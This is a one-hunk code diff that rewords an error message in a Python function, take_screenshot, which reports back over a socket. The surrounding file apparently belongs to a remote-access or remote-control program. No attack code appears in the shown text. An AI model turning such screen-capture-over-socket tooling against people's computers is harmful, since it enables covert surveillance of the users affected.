@@ -567,7 +567,7 @@ def take_screenshot(socket) -> bool:
         return True
 
     except Exception as e:
-        socket_send(socket, f"[!] Unexpected error during screenshot: {str(e)}")
+        socket_send(socket, f"[!] Error: Unexpected error during screenshot: {str(e)}")
         return False
 
 
